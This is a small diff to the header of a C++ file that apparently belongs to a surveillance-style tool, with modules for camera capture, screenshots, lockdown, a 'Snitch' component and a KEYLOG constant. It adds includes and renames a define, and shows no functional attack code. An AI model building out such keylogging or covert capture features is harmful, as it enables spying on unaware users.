@@ -5,6 +5,7 @@
 #include "../Control/Camera.h"
 #include "../DataManagement/Converters.h"
 #include "../Network/Connect.h"
+#include "../Control/Snitch.h"
 #include "../Control/Screenshoter.h"
 #include "../Control/Lockdown.h"
 #include "../Network/ApiOperations.h"
@@ -12,6 +13,8 @@
 #include <string>
 #include <iterator>
 #include <time.h>
+#include <shellapi.h>
+#include <queue>
 
 #define Camera "CAMERA"
 #define Keylog "KEYLOG"
@@ -32,7 +35,7 @@
 
 #define DATA_FOLDER_PATH "temp/"
 
-#define DATA_ID "dataId"
+#define DATA_TYPE "dataType"
 
 struct CompareDates {
 	bool operator() (WIN32_FIND_DATA data1, WIN32_FIND_DATA data2) const {
